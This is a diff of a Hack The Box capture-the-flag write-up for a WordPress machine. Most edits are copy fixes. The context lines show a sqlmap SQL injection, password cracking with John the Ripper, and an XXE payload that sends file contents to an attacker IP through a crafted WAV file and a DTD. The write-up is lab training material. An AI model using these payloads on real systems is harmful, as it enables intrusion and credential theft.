@@ -3,7 +3,7 @@
 #+options: ^:{}
 
 * Connection and nmap
-First we connect to the openvpn that HTB provides us and spin the machine
+First we connect to the openvpn that HTB provides us and spin the machine.
 Then we will use nmap, as usual for enumeration:
 
 #+begin_src shell :results output :wrap "quote" :exports code
@@ -38,7 +38,7 @@ This allows us to open the hostname in the browser without any problem.
 Of course this is true for Linux (which you probably should be using), in Windows is
 a little more complicated and I struggled to be able to do this the first time. I
 tried to change the host file in System32, then flush the dns and nothing worked.
-Finally I simply installed firefox in WSL2 Kali and I use VcXsrv to view all GUI
+Finally I simply installed firefox in WSL2 Kali and I used VcXsrv to view all GUI
 apps.
 
 One way or another we should be able to browse the page now.
@@ -54,14 +54,13 @@ security.
 wpscan --url http://metapress.htb
 #+end_src
 
-
-You can look them up in https://wpscan.com/wordpress/562 and go through each of
-them but if we go back to the source code of the events page we can see that is
-using a plugin called Bookingpress and filter our search. In the same page we
-can see that there is a SQL injection vulnerability and a proof of concept.  In
-the curl command that is provided we can see that is taking advantage of
-Wordpress nonces, which we can look in the source code such as the one in the
-generateSpamCatcha function.
+You can look the vulnerabilities in https://wpscan.com/wordpress/562 and go
+through each of them but if we go back to the source code of the events page we
+can see that is using a plugin called Bookingpress and filter our search. In the
+same page we can see that there is a SQL injection vulnerability and a proof of
+concept.  In the curl command that is provided we can see that is taking
+advantage of Wordpress nonces, which we can look in the source code such as the
+one in the generateSpamCatcha function.
 
 There is a lot of information there but the first thing that catches the eye is
 the fact that is telling us that the version of Wordpress (5.6.2) is identified
@@ -117,7 +116,7 @@ sqlmap -u "http://metapress.htb/wp-admin/admin-ajax.php"
     &category_id=33&total_service=1" -p "total_service" --dbs
 #+end_src
 That way we can enumerate the databases present. I had problems with this command
-since it kept saying that the connection was not stable but i just kept trying
+since it kept saying that the connection was not stable but I just kept trying
 and eventually I could do it.
 
 The databases that we could found are two: blog and information_schema.
@@ -131,7 +130,7 @@ sqlmap -u "http://metapress.htb/wp-admin/admin-ajax.php"
 Now we look inside the blog database and enumerate the tables: there is a lot of them
 but the first that catches the eye is wp_users. After some horrible looking output
 we can see that it found two users, admin and manager.
-Along side the names we can see the hashes that correspond to the passwords, so we
+Alongside the names we can see the hashes that correspond to the passwords, so we
 will copy them to a file and try to crack them.
 
 * Cracking the passwords: John the Ripper
@@ -140,10 +139,10 @@ will copy them to a file and try to crack them.
 john password.txt --wordlist=/usr/share/wordlists/rockyou.txt
 #+end_src
 We are using John the Reaper which is a hashcracking program, in this case we are
-using the classic rockyou wordlist that. I had to decompress the rockyou file before
+using the classic rockyou wordlist. I had to decompress the rockyou file before
 utilizing the command, just so you know.
 
-We see that it found one password, the manager's which is "partylikearockstar".
+We see that it found one password: the manager's. Which is "partylikearockstar".
 
 So we have a username and a password but we have to find out where to enter them.
 Although there is no login link in the page, based in our enumeration we know that
@@ -155,7 +154,7 @@ and we are in!
 
 Looking around the vulnerabilities of this version of Wordpress I encounter this
 article: https://blog.wpsec.com/wordpress-xxe-in-media-library-cve-2021-29447/
-It's a fascinating thing. It essentially uses the metadata of a WAVE file to
+It's a fascinating thing. It essentially uses the metadata of a WAV file to
 inject payload and retrieve information.
 
 #+begin_src shell :results output :wrap "quote" :exports code
@@ -165,9 +164,10 @@ echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml
 payload.wav
 #+end_src
 That is the code that the author suggests, the only thing we should change it's the
-ip, replacing it with our own and I also changed the port to 1234 for convenience.
+IP and I also changed the port to 1234 for convenience.
 
-Now if we continue with the article we have to send this payload through a dtd file
+Now if we continue with the article, we are told
+to send this payload through a dtd file
 which will look like this:
 
 #+begin_src shell :results output :wrap "quote" :exports code
@@ -177,14 +177,14 @@ which will look like this:
           trick SYSTEM 'http://10.10.14.83:1234/?p=%file;'>">
 #+end_src
 
-Again we have to modify the ip and port.
+Again we have to modify the IP and port.
 
-We will start a php server:
+We will start a PHP server:
 #+begin_src shell :results output :wrap "quote" :exports code
 php -S 0.0.0.0:1234
 #+end_src
 
-And we go the the media page. Then click on add new and upload our payload.wav while
+And we go the media page. Then click on add new and upload our payload.wav while
 the server is still running. We will get a huge, horrible looking output but we can
 decode it using:
 #+begin_src shell :results output :wrap "quote" :exports code
@@ -278,7 +278,7 @@ require_once ABSPATH . 'wp-settings.php';
 #+end_src
 
 There is a lot of hashes in there but the interesting thing is that we have a method:
-FTP, the user and the password (hashed). We already tried to connect to ftp and we
+FTP, the user and the password (hashed). We already tried to connect to FTP and we
 couldn't so maybe this could prove useful.
 
 * Getting the credentials
@@ -288,10 +288,10 @@ ftp 10.10.11.186
 #+end_src
 And we enter our newly found credentials.
 
-If we list the files using ls, we will see two folders: blog and mailer.
-We cd to mailer and then download the send_email.php file with the get command.
-It will download to our current directory and if we cat it we can see that there are
-more credentials!
+If we list the files using ls, we will see two folders: blog and mailer.  We
+enter the mailer directory and then download the send_email.php file with the
+get command.  It will download to our current directory and if we cat it we can
+see that there are more credentials!
 
 In particular these two could be used for ssh access:
 #+begin_quote
@@ -325,10 +325,6 @@ gpg2john key > pass_hash
 #+end_src
 
 And run it through john again:
-#+begin_src sh :results output :wrap "quote" :exports code
-john --wordlist=/usr/share/wordlists/rockyou.txt pass_hash
-#+end_src
-And once it is done:
 #+begin_src sh :results output :wrap "quote" :exports code
 john --wordlist=/usr/share/wordlists/rockyou.txt pass_hash
 #+end_src
